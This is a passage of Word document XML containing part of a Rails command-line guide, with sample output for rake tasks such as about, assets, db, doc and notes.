        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="7F361C42" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0409689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rake --tasks</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77FEC07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(in /home/foobar/commandsapp)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="032BBF3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rake db:abort_if_pending_migrations       # Raises an error if there are pending migrations</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4052D32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rake db:charset                           # Retrieves the charset for the current environment's database</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="447A7D6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rake db:collation                         # Retrieves the collation for the current environment's database</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A29657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rake db:create                            # Create the database defined in config/database.yml for the current Rails.env</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1126043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7A7C42C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0C1A270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rake tmp:pids:clear                       # Clears all files in tmp/pids</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6259136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rake tmp:sessions:clear                   # Clears all files in tmp/sessions</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E4B70E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rake tmp:sockets:clear                    # Clears all files in tmp/sockets</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="59E71CD7"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2.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>about</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124A5088"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 about</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gives information about version numbers for Ruby, RubyGems, Rails, the Rails subcomponents, your application’s folder, the current Rails environment name, your app’s database adapter, and schema version. It is useful when you need to ask for help, check if a security patch might affect you, or when you need some stats for an existing Rails installation.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="6F1DEBE7" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="48001E8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rake about</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="479F6EC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About your application's environment</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A69339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Ruby version              1.9.3 (x86_64-linux)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40EDE2C8"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RubyGems version          1.3.6</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0121D6D8"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Rack version              1.3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A3BDB30"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Rails version             4.0.0.beta</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35547530"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JavaScript Runtime        Node.js (V8)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="042092F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Active Record version     4.0.0.beta</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70B395E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Action Pack version       4.0.0.beta</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="348A20D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Action Mailer version     4.0.0.beta</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="321A7B3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Active Support version    4.0.0.beta</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CF700F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Middleware                ActionDispatch::Static, Rack::Lock, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, ActionDispatch::DebugExceptions, ActionDispatch::RemoteIp, ActionDispatch::Reloader, ActionDispatch::Callbacks, ActiveRecord::ConnectionAdapters::ConnectionManagement, ActiveRecord::QueryCache, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, ActionDispatch::Head, Rack::ConditionalGet, Rack::ETag, ActionDispatch::BestStandardsSupport</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AEDF9B2"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Application root          /home/foobar/commandsapp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4691114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Environment               development</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4651D00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Database adapter          sqlite3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BA7601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Database schema version   20110805173523</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="69EFFACC"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2.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367543F2"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You can precompile the assets in </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> using </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake assets:precompile</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and remove those compiled assets using </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake assets:clean</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BBC5A9A"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2.3 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13ECAEEC"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most common tasks of the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rake namespace are </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and it will pay off to try out all of the migration rake tasks (</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>redo</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>reset</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:version</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is useful when troubleshooting, telling you the current version of the database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FF5990"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More information about migrations can be found in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId907" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Migrations</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541BF49A"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2.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>doc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F83AB8F"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w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>doc:</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> namespace has the tools to generate documentation for your app, API documentation, guides. Documentation can also be stripped which is mainly useful for slimming your codebase, like if you’re writing a Rails application for an embedded platform.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09597135" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="232"/>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 doc:app</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> generates documentation for your application in </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>doc/app</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4758B314" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="232"/>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 doc:guides</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> generates Rails guides in </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>doc/guides</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DAE247" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="232"/>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 doc:rails</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> generates API documentation for Rails in </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>doc/api</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582799BB"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2.5 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>notes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02416FE8"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 notes</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will search through your code for comments beginning with FIXME, OPTIMIZE or TODO. The search is done in files with extension </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.builder</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.haml</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.slim</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for both default and custom annotations.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="50D06859" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="236ECA0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rake notes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C48877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(in /home/foobar/commandsapp)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3580ED4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app/controllers/admin/users_controller.rb:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E1C17C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 [ 20] [TODO] any other way to do this?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06CA3792"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 [132] [FIXME] high priority for next deploy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16C2879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3FD7DA5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app/model/school.rb:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56DFD71A"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 [ 13] [OPTIMIZE] refactor this code to make it faster</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="644BF3A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 [ 17] [FIXME]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66400E1F"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If you are looking for a specific annotation, say FIXME, you can use </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake notes:fixme</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Note that you have to lower case the annotation’s name.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="3349FAF0" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="426ABBC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rake notes:fixme</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13B2156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(in /home/foobar/commandsapp)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31EB3FD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app/controllers/admin/users_controller.rb:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28FE1DB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 [132] high priority for next deploy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37C7995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szCs w:val="24"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F51F1C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app/model/school.rb:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05B6077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 [ 17]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="382C8954"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You can also use custom annotations in your code and list them using </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake notes:custom</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> by specifying the annotation using an environment variable </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ANNOTATION</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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5760"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="3B266194" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
